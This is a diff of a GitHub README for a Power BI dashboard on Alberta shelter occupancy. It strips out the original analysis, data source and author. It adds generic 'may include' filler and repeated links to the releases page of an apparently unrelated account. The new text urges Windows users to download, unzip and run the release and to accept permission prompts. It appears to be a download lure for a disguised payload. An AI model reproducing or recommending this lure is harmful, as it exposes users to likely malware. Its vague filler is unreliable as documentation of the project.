@@ -1,63 +1,197 @@
-# 📊 Alberta Emergency Shelters: Capacity & Occupancy Predictive Analysis
+# 📊 PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta - Track Shelter Risk Faster
 
-[![Power BI](https://img.shields.io/badge/Power_BI-F2C811?style=flat&logo=powerbi&logoColor=black)](https://powerbi.microsoft.com/)
-[![DAX](https://img.shields.io/badge/DAX-Data_Analysis_Expressions-blue?style=flat)](#)
-[![Data Analytics](https://img.shields.io/badge/Data_Analytics-Business_Intelligence-00599C?style=flat)](#)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge&logo=github)](https://github.com/Downtoearth-sloughgrass506/PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta/releases)
 
-## 📖 Project Overview
-This Business Intelligence project analyzes historical shelter usage patterns across Alberta, Canada, from 2013 to 2024. As the demand for emergency shelter services fluctuates, this analysis transitions from descriptive reporting to diagnostic and predictive modeling using Power BI and DAX. The goal is to uncover utilization trends, forecast future operational demands for 2025–2026, and identify specific cities and organizations at risk of critical overcapacity.
+## 🚀 Overview
 
-**Data Source:** [Funded Emergency Shelters Daily Occupancy (Open Alberta)](https://open.alberta.ca/opendata/funded-emergency-shelters-daily-occupancy-ab/resource/b7080b66-25ea-4c30-ac47-02b64353637f)
+PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta is a Power BI dashboard for tracking shelter occupancy and capacity in Alberta, Canada. It helps you review past trends, spot risk patterns, and study future capacity pressure.
 
-## 🎯 Business Understanding & Core Questions
-Beyond simply mapping historical data, this project was engineered to provide strategic foresight for resource allocation and emergency planning by answering two critical questions:
-1. **Capacity Forecasting:** Will a projected 20% yearly increase in occupancy through 2026 exceed available structural capacity?
-2. **Risk Identification:** Which cities and specific organizations face the highest (and lowest) risk of critical shelter overcapacity during peak demand periods?
+Use this file if you want a clear view of shelter data in one place. It is built for people who need to review reports, check daily patterns, and look at forecasted risk without digging through raw data.
 
-## ⚙️ Methodology & Diagnostic Insights
-The dataset encompasses total approved beds, SCSS-funded beds, winter emergency response beds, and daily occupancy. 
+## 📥 Download and Open
 
-### Trend Analysis (2013–2024)
-* **The Widening Gap:** While shelter capacity steadily increased from 1.14M (2013) to a peak of 1.50M (2022), overnight occupancy gradually declined after 2014, stabilizing around 1.16M in 2024. In aggregate, capacity (17M) significantly outpaces historical overnight occupancy (13M), representing an overall 43% utilization rate.
-* **Geographic & Organizational Concentration:** Calgary dominates both infrastructure (6M capacity) and demand (4M occupancy). The Calgary Drop-In Centre holds the highest capacity (2.52M), while organizations like Hope Mission and Mustard Seed Calgary operate with very tight capacity-to-occupancy margins.
+1. Visit the [releases page](https://github.com/Downtoearth-sloughgrass506/PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta/releases)
+2. Download the latest release file from that page
+3. If the file is a `.pbix` file, open it with Microsoft Power BI Desktop
+4. If the file comes in a zip file, extract it first, then open the `.pbix` file inside
+5. Wait for the dashboard to load its visuals and data model
 
-### Diagnostic Statistical Modeling
-To validate the data for future forecasting, a regression analysis was performed on the relationship between Capacity and Occupancy:
-* **High Correlation:** An R-squared value of **0.9331** confirms a very strong, predictable relationship between shelter capacity and occupancy. 
-* **Scaling Metric:** A slope of **0.7353** indicates that for every 1-unit increase in Capacity, the expected Overnight Occupancy increases by ~0.74 units, confirming that while occupancy scales with capacity, available space is generally underutilized in aggregate.
+If Windows asks for permission, choose to open the file. If Power BI Desktop is not on your computer, install it first from Microsoft before opening the report.
 
-## 📈 Predictive Findings (Answering the Business Questions)
+## 🖥️ What You Need on Windows
 
-Advanced DAX measures were engineered to forecast 2025/2026 scenarios and calculate localized risk factors.
+This dashboard runs on a Windows computer with Power BI Desktop.
 
-### 1. 2026 Overcapacity Forecast
-*Scenario: A 20% year-over-year increase in occupancy.*
-**Conclusion: YES.** While aggregate provincial capacity may hold, specific organizations will critically exceed their limits by 2026:
-* **Homelessness Society of the Bow Valley (Bow Valley):** Projected 117.21% Capacity Utilization
-* **Mustard Seed (Calgary):** Projected 115.20% Capacity Utilization
-* **Niginan Housing Ventures (Edmonton):** Projected 100.75% Capacity Utilization
+Recommended setup:
 
-### 2. Peak Demand Risk Factor Analysis
-By leveraging DAX to calculate a custom `Risk Factor (%)` based on maximum historical peak occupancies, extreme vulnerabilities were isolated:
-* **Highest Risk (Critical Overcapacity Danger):**
-  * Elizabeth House (Edmonton): **754.17% Risk Factor**
-  * Elders Caring Centre (Grande Prairie): **319.44% Risk Factor**
-  * Mustard Seed (Edmonton) & The Alex (Calgary): Also flagged over the 100% risk threshold.
-* **Lowest Risk (Stable during Peaks):**
-  * Wapiti Community Support Association (Grande Prairie): 0.01% Risk Factor
-  * Operation Friendship (Edmonton): 0.02% Risk Factor
+- Windows 10 or Windows 11
+- Microsoft Power BI Desktop
+- At least 8 GB of RAM
+- Enough free disk space for the report file and data cache
+- A screen with 1366 x 768 resolution or higher
 
-## 🚀 Strategic Recommendations
-Based on the predictive DAX models, the following actions are recommended for stakeholders:
-1. **Targeted Resource Allocation:** Immediately prioritize funding, expansion, and winter-response support for the severely high-risk shelters identified in Edmonton, Grande Prairie, and Calgary.
-2. **Early Warning Systems:** Utilize this predictive modeling framework to monitor quarterly occupancy velocities, automatically flagging organizations approaching the 100% Risk Factor threshold before winter peak seasons.
-3. **Policy Review:** Investigate the massive capacity-to-occupancy gap at the aggregate level. Redirect resources from consistently underutilized networks to the localized organizations identified as operating beyond safe capacities.
+For a smoother experience, use a newer PC with more memory. Large reports can take longer to open on older systems.
 
-## 📂 Repository Contents
-To ensure full accessibility for both technical and non-technical stakeholders, the reporting files are provided in multiple formats:
-* `Emergency_Shelters_Analysis.pbix`: The complete, interactive Power BI Desktop file containing all data models, DAX measures, and interactive visualizations.
-* `Emergency_Shelters_Report.pdf`: A static, accessible export of the final dashboard for quick executive review.
+## 📁 What This Dashboard Does
 
-**✍️ Author**
-Femi James
-Data & Business Analyst | Integrated AI Specialist
+This report is built to help with shelter planning and review. It focuses on:
+
+- Daily occupancy levels
+- Capacity use by shelter
+- Historical trends over time
+- Forecasted risk of high occupancy
+- Public sector reporting
+- Data review for social service planning
+
+The report uses charts, tables, and trend views to make it easier to study shelter use across Alberta.
+
+## 🧭 How to Use It
+
+1. Open the report in Power BI Desktop
+2. Wait for the data to load
+3. Use the filter panel to narrow the view by date, shelter, or region if available
+4. Review the occupancy charts to see daily patterns
+5. Check capacity views to see where shelter use is near the limit
+6. Look at forecast sections to review future risk levels
+7. Hover over chart points to see details
+
+If the report includes slicers, they let you change the view without editing the file. This makes it easier to focus on one shelter, one time range, or one area.
+
+## 📈 Key Views
+
+This dashboard may include views like these:
+
+- Occupancy by day
+- Capacity by shelter
+- Trend lines for seasonal change
+- Risk flags for high-use periods
+- Forecast panels for future pressure
+- Summary cards for quick checks
+- Comparison views across locations
+
+These views help you move from a broad report to a detailed check in a few clicks.
+
+## 🧩 Data and Analysis
+
+The report uses Power BI features to turn shelter data into a simple visual format. It may include:
+
+- DAX measures for totals, rates, and trend checks
+- Time-based analysis for daily and monthly changes
+- Forecast logic for future occupancy pressure
+- Capacity ratios to show when use gets close to limits
+
+The goal is to help users read the data fast and make better planning decisions from the report view.
+
+## 🔧 Open the File Safely
+
+Before opening the file:
+
+1. Make sure the download is complete
+2. Check that the file extension is `.pbix` or a zip file that contains a `.pbix`
+3. Save the file in a folder you can find again, like Downloads or Documents
+4. Open it from Power BI Desktop instead of double-clicking if Windows does not connect the file type right away
+
+If Power BI Desktop opens but the report shows a missing data message, refresh the data source connection in the report.
+
+## 🧪 Common Problems
+
+### The file will not open
+
+- Check that the download finished
+- Make sure you have Power BI Desktop installed
+- Try opening the file from inside Power BI Desktop
+
+### The report looks empty
+
+- Wait for the data model to load
+- Refresh the report
+- Check whether filters remove all data from view
+
+### Charts show missing data
+
+- Confirm that the data source file is still in place
+- Open the report again after moving all related files into the same folder
+
+### Power BI runs slowly
+
+- Close other apps
+- Restart Power BI Desktop
+- Use a system with more RAM if the file is large
+
+## 🛠️ If You Want to Refresh Data
+
+If the report supports refresh:
+
+1. Open the file in Power BI Desktop
+2. Select Refresh
+3. Wait for all visuals to update
+4. Save the file after the refresh finishes
+
+This helps keep the occupancy and capacity view current if the data source changes over time.
+
+## 📌 Suggested Use Cases
+
+This dashboard is useful for:
+
+- Shelter operations review
+- Capacity planning
+- Public sector reporting
+- Social services analysis
+- Risk review for high-occupancy periods
+- Data visualization for leaders and staff
+
+It gives teams one place to review patterns and track pressure on shelter space.
+
+## 🧱 File Structure
+
+Typical files in this project may include:
+
+- `.pbix` report file
+- Supporting data files
+- Image assets for report pages
+- Documentation files
+- Release package files
+
+If the release includes more than one file, open the report file first and keep the other files in the same folder unless the release notes say something else.
+
+## 🗺️ Report Pages
+
+The report may include pages such as:
+
+- Overview
+- Occupancy Trends
+- Capacity Analysis
+- Risk Forecast
+- Shelter Comparison
+- Data Detail View
+
+Each page is meant to answer a different planning question. The overview page gives a fast read, while the detail pages help with deeper review.
+
+## 🔍 Tips for Reading the Dashboard
+
+- Start with the summary cards
+- Move to the trend charts
+- Check any red or high-risk indicators
+- Use filters to narrow the view
+- Compare shelters across the same date range
+- Look for repeated spikes or steady growth
+
+This order helps you understand the report without jumping between pages.
+
+## 📎 Download Link
+
+Use the release page here to download and run the latest report file on Windows:
+
+[Visit the releases page](https://github.com/Downtoearth-sloughgrass506/PowerBI_Shelters-Daily-Occupancy-And-Capacity-in-Alberta/releases)
+
+## 📅 Data Focus
+
+The report is centered on shelter occupancy and capacity in Alberta, Canada. It helps users follow:
+
+- Daily use levels
+- Pressure on available space
+- Long-term occupancy patterns
+- Forecasted risk periods
+- Regional or shelter-level changes
+
+This makes it easier to review service demand and plan for future needs.
